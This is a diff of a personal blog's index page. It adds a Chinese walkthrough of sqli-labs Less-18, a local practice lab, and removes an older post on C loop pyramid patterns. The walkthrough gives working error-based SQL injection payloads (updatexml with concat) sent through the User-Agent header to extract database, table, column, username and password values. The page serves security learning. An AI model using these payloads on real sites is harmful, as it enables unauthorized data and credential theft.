@@ -64,6 +64,56 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-18" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/10/sql-labs-Less-18/" class="article-date">
+  <time datetime="2021-02-10T09:44:55.000Z" itemprop="datePublished">2021-02-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-18</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/%EF%BC%8Cusername%E5%92%8Cpassword%E8%BE%93%E5%85%A5admin%E7%99%BB%E5%85%A5%EF%BC%9A">http://127.0.0.1/sql/Less-18/，username和password输入admin登入：</a></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/1.png" alt="1"><br>显示了我们的IP地址（这个没登入也有）和agent；<br>通过查看源代码：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/2.png" alt="2"><br>看到username和password都用了check_input()函数，所以不能在username和password里进行注入。<br>但是在源代码看到<br><code>$insert=&quot;INSERT INTO </code>security<code>.</code>uagents<code> (</code>uagent<code>, </code>ip_address<code>, </code>username<code>) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code><br>意思是将useragent和ip插入到数据库中，所以我们可以在useragent和ip这里考虑一下注入。Ip地址我们这里修改不是很方便，但是useragent修改较为方便，我们从useragent入手。<br>首先我们把http header live(火狐浏览器的插件)打开</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/3.png" alt="3"><br>在<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/">http://127.0.0.1/sql/Less-18/</a> 登入后再把刚才那个http header live打开</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/4.png" alt="4"><br>可以看到我们的User-Agent，点击进入：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/5.png" alt="5"><br>接下来按f12打开hackbar（火狐浏览器插件）</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/6.png" alt="6"><br>再这样：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/7.png" alt="7"><br>再在U那个栏里面输入’,发现报错：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/8.png" alt="8"><br>且语句中有<code>127.0.0.1&#39;, &#39;admin&#39;)</code>,我们可以猜想原语句可能是(‘ABC’,…’ABC’…,’ABC’)这样的。<br>我们再输入一个’测试一下：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/9.png" alt="9"><br>发现没有报错，说明是用’注入的。<br>知道了注入字符，接下来就开始注入了，这里用的是报错注入，不能用布尔盲注，因为无论错误还是正确都不会报错。<br>爆库：输入’and updatexml(1,concat(0x7e,(select database()),0x7e),1) and’<br>爆表：’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1) and’<br>爆列：’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1) and’<br>爆数据：’and updatexml(1,concat(0x7e,(select id from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and’</p>
+<p>以上也可以用’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’,’’)#<br>上面有,’’,’’)是因为报错里有127.0.0.1、admin，而且只输入’,’’,’’)#没有报错。</p>
+<p>PS:如果用hackbar在user-agent进行注入没反应的话可能要把浏览器重启一下。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/10/sql-labs-Less-18/" data-id="ckkzsewlz0000dwux0gxkdvnu" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-17" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/09/sql-labs-Less-17/" class="article-date">
@@ -603,53 +653,6 @@
 
 
   
-    <article id="post-类金字塔型题" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/11/22/%E7%B1%BB%E9%87%91%E5%AD%97%E5%A1%94%E5%9E%8B%E9%A2%98/" class="article-date">
-  <time datetime="2020-11-22T10:30:07.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/22/%E7%B1%BB%E9%87%91%E5%AD%97%E5%A1%94%E5%9E%8B%E9%A2%98/">类金字塔型题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#类金字塔型题<br>###解法：把复杂的整体分解成几个部分（包括空白部分），再分别用循环语句实现（一般有几个部分就有几个for语句）。<br>##1.输出：<br>正输：<br>0<br>00<br>000<br>0000</p>
-<p>反输：<br>0000<br>000<br>00<br>0<br>语句1（正输）：<br>for(i=1;i&lt;=n;i=i+1)  //输出i列(基本没什么变化)<br>{<br>for(j=1;j&lt;=n;j=j+1)  //输出j个(个数变化取决于两个’ ; ‘之间的表达式)<br>{<br>printf(“0/%d/%c”[,    ]) //输出0，输出字符取决于“  ”和[ ]之间的表达式<br>}<br>}  </p>
-<ul>
-<li>tips1:输入正反（左右）<br><code>printf中[]的表达式：正输：a+j ；反输：a-j。</code><br><code>其中a为常数,可从题目中求出，且以上表达式可能会用到&#39; i &#39;</code>  </li>
-<li>tips2:输入正反（上下）<br><code>第二个for语句中两个&#39; ; &#39;的表达式：正输：a*i+b ；反输：a*n-b*i+c。</code><br><code>其中a，b，c为常数，可从题目求出</code>  </li>
-</ul>
-<p>##2.输出：<br>正输:<br>0001<br>00111<br>011111<br>1111111                        </p>
-<p>反输：<br>1111111<br>011111<br>00111<br>0001<br>###分解成0三角和1三角<br>语句2（0三角反输，1三角正输）：<br>for(i=1;i&lt;=n;i=i+1)  //输出i列(基本没什么变化)<br>{<br>for(j=1;j&lt;=n-i-1;j=j+1)  //输出0三角<br>{<br>printf(“0”)<br>}<br>for(j=1;j&lt;=2*i-1;j=j+1) //输出1三角<br>{<br>printf(“1”)<br>}<br>}  </p>
-<p>##3.输出：<br>正输:<br>0001222<br>0011122<br>0111112<br>1111111                             </p>
-<p>反输：<br>1111111<br>0111112<br>0011122<br>0001222<br>###分解成0三角，1三角和2三角<br>语句3（0三角反输，1三角正输，2三角反输）：<br>for(i=1;i&lt;=n;i=i+1)  //输出i列(基本没什么变化)<br>{<br>for(j=1;j&lt;=n-i-1;j=j+1)  //输出0三角<br>{<br>printf(“0”)<br>}<br>for(j=1;j&lt;=2*i-1;j=j+1) //输出1三角<br>{<br>printf(“1”)<br>}<br>for(j=1;j&lt;=n-i-1;j=j+1)  //输出2三角<br>{<br>printf(“2”)<br>}<br>}  </p>
-<p>有例子<br><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2020/11/22/%E7%B1%BB%E9%87%91%E5%AD%97%E5%A1%94%E9%A2%98%E5%9E%8B/1.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/22/%E7%B1%BB%E9%87%91%E5%AD%97%E5%A1%94%E5%9E%8B%E9%A2%98/" data-id="ckht1tuzc0000kcuxes7a4uuf" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -686,6 +689,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/17/sql-labs-Less-27/">sql-labs-Less-27</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
           </li>
         
@@ -699,10 +706,6 @@
         
           <li>
             <a href="/2021/02/15/sql-labs-Less-25/">sql-labs-Less-25</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
           </li>
         
       </ul>
